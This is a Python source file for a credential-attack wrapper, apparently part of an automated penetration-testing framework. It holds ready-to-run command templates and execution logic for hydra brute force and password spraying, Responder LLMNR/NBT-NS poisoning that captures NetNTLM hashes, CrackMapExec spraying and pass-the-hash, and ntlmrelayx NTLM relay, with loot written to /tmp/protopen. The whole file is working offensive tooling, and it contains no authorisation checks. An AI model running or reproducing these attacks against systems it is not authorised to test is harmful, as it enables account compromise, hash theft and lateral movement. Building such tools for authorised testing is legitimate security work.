"""Credential attack tool — hydra brute force, password spraying, Responder/CrackMapExec/NTLM relay."""

from __future__ import annotations

import logging
import os
import tempfile
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)

_LOOT_DIR = "/tmp/protopen"


class CredentialAttackTool(BasePentestTool):
    """Wrapper for credential attack tools — hydra, medusa, Responder, CrackMapExec, ntlmrelayx."""

    name = "credential_attack"
    description = (
        "Credential attacks — hydra brute force, password spraying, "
        "SSH/FTP/HTTP/SMB login testing, Responder LLMNR/NBT-NS poisoning, "
        "CrackMapExec SMB enumeration/spraying/pass-the-hash, NTLM relay."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "hydra_brute": {
            "cmd": [
                "hydra",
                "-l",
                "{username}",
                "-P",
                "{wordlist}",
                "{target}",
                "{service}",
                "-t",
                "{threads}",
                "-f",
            ],
            "timeout": 600,
            "description": "Brute force a single user with a password list",
        },
        "hydra_spray": {
            "cmd": [
                "hydra",
                "-L",
                "{userlist}",
                "-p",
                "{password}",
                "{target}",
                "{service}",
                "-t",
                "{threads}",
                "-f",
            ],
            "timeout": 600,
            "description": "Password spray a single password across user list",
        },
        "hydra_combo": {
            "cmd": [
                "hydra",
                "-C",
                "{combolist}",
                "{target}",
                "{service}",
                "-t",
                "{threads}",
                "-f",
            ],
            "timeout": 600,
            "description": "Combo list attack (user:pass format)",
        },
        "responder": {
            "cmd": [
                "timeout",
                "{duration}",
                "responder",
                "-I",
                "{interface}",
                "-rdwv",
            ],
            "timeout": 600,
            "description": (
                "Poison LLMNR/NBT-NS/mDNS on the specified interface and capture "
                "NetNTLM hashes. Hashes stored to /tmp/protopen/responder_<interface>.txt."
            ),
        },
        "crackmapexec_enum": {
            "cmd": [
                "crackmapexec",
                "smb",
                "{network}",
                "--users",
                "--shares",
                "--groups",
            ],
            "timeout": 120,
            "description": "Enumerate SMB hosts, users, shares, and groups across a subnet",
        },
        "crackmapexec_spray": {
            "cmd": [
                "crackmapexec",
                "smb",
                "{target}",
                "-u",
                "{userlist_file}",
                "-p",
                "{password}",
                "--continue-on-success",
            ],
            "timeout": 300,
            "description": "Password spray a single password across a user list against an SMB target",
        },
        "ntlm_relay": {
            "cmd": [
                "ntlmrelayx.py",
                "-tf",
                "{targets_file}",
                "-smb2support",
                "-l",
                "/tmp/protopen/relay_loot",
            ],
            "timeout": 600,
            "description": (
                "NTLM relay attack — relay incoming authentications to target hosts. "
                "Loot written to /tmp/protopen/relay_loot. [REDTEAM]"
            ),
            "risk_level": "redteam",
        },
        "crackmapexec_pth": {
            "cmd": [
                "crackmapexec",
                "smb",
                "{target}",
                "-u",
                "{username}",
                "-H",
                "{hash}",
                "--shares",
            ],
            "timeout": 60,
            "description": (
                "Pass-the-hash via CrackMapExec — authenticate with an NTLM hash "
                "and enumerate accessible shares. [REDTEAM]"
            ),
            "risk_level": "redteam",
        },
    }

    async def execute(
        self,
        action: str,
        target: str = "",
        service: str = "ssh",
        username: str = "",
        password: str = "",
        wordlist: str = "",
        userlist: str = "",
        combolist: str = "",
        threads: int = 4,
        timeout: int = 600,
        # Responder params
        interface: str = "eth0",
        duration: int = 300,
        # CME / NTLM relay params
        network: str = "",
        targets: str = "",
        hash: str = "",
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        spec = self.ACTIONS[action]
        effective_timeout = spec.get("timeout", timeout)

        # ── action-specific pre-processing ───────────────────────────────────

        if action == "responder":
            os.makedirs(_LOOT_DIR, exist_ok=True)
            cmd = [
                c.format(
                    interface=interface,
                    duration=str(duration),
                )
                for c in spec["cmd"]
            ]
            result = await self._run(
                action=action,
                cmd=cmd,
                timeout=duration + 5,
                target_hint=interface,
            )
            # Persist captured output alongside Responder's own log
            out_path = os.path.join(_LOOT_DIR, f"responder_{interface}.txt")
            try:
                with open(out_path, "a") as fh:
                    fh.write(result)
                    fh.write("\n")
            except OSError as exc:
                logger.warning("Could not write responder output to %s: %s", out_path, exc)
            return result

        if action == "crackmapexec_enum":
            cmd = [c.format(network=network or target) for c in spec["cmd"]]
            return await self._run(
                action=action,
                cmd=cmd,
                timeout=effective_timeout,
                target_hint=network or target,
            )

        if action == "crackmapexec_spray":
            # userlist may be a comma-separated string — write to a temp file
            userlist_file = userlist
            _tmp_userlist = None
            if "," in userlist or not os.path.isfile(userlist):
                users = [u.strip() for u in userlist.split(",") if u.strip()]
                _tmp_userlist = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", prefix="cme_users_", delete=False)
                _tmp_userlist.write("\n".join(users))
                _tmp_userlist.flush()
                _tmp_userlist.close()
                userlist_file = _tmp_userlist.name

            try:
                cmd = [
                    c.format(
                        target=target,
                        userlist_file=userlist_file,
                        password=password,
                    )
                    for c in spec["cmd"]
                ]
                return await self._run(
                    action=action,
                    cmd=cmd,
                    timeout=effective_timeout,
                    target_hint=target,
                )
            finally:
                if _tmp_userlist is not None:
                    try:
                        os.unlink(_tmp_userlist.name)
                    except OSError:
                        pass

        if action == "ntlm_relay":
            os.makedirs(_LOOT_DIR, exist_ok=True)
            # targets may be comma-separated IPs — write to temp file
            _tmp_targets = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", prefix="relay_targets_", delete=False)
            ip_list = [ip.strip() for ip in targets.split(",") if ip.strip()]
            _tmp_targets.write("\n".join(ip_list))
            _tmp_targets.flush()
            _tmp_targets.close()

            try:
                cmd = [c.format(targets_file=_tmp_targets.name) for c in spec["cmd"]]
                relay_timeout = duration if duration > 0 else effective_timeout
                return await self._run(
                    action=action,
                    cmd=cmd,
                    timeout=relay_timeout + 5,
                    target_hint=targets,
                )
            finally:
                try:
                    os.unlink(_tmp_targets.name)
                except OSError:
                    pass

        if action == "crackmapexec_pth":
            cmd = [
                c.format(
                    target=target,
                    username=username,
                    hash=hash,
                )
                for c in spec["cmd"]
            ]
            return await self._run(
                action=action,
                cmd=cmd,
                timeout=effective_timeout,
                target_hint=target,
            )

        # ── default hydra actions ─────────────────────────────────────────────
        cmd = [
            c.format(
                target=target,
                service=service,
                username=username,
                password=password,
                wordlist=wordlist,
                userlist=userlist,
                combolist=combolist,
                threads=str(threads),
            )
            for c in spec["cmd"]
        ]
        return await self._run(
            action=action,
            cmd=cmd,
            timeout=effective_timeout,
            target_hint=target,
        )
